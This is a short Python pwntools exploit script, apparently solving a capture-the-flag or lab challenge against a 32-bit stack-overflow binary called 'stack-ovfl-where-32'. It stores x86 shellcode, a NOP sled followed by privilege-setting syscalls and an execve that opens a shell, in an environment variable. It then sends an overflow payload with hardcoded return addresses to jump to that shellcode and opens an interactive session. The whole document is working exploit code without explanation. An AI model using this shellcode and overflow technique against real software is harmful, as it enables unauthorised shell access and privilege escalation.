#!/usr/bin/env python

from pwn import *
import os

env = {
    'shellcode': "\x90\x90\x90\x90\x90\x90\x90\x90j2X\xcd\x80PP[YjGX\xcd\x80\x99RYjAT[j\x0bX\xcd\x80",
}

context.terminal = ['tmux', 'splitw', '-h']
p = process('./stack-ovfl-where-32', env=env)
#gdb.attach(p, 'b *input_func +106')

buf = "BBBB" + p32(0xffffdfc0) + "A" * 0x1e + p32(0xffffddd2) + p32(0x0804854c)

p.sendline(buf)
print(p.recv())
p.interactive()
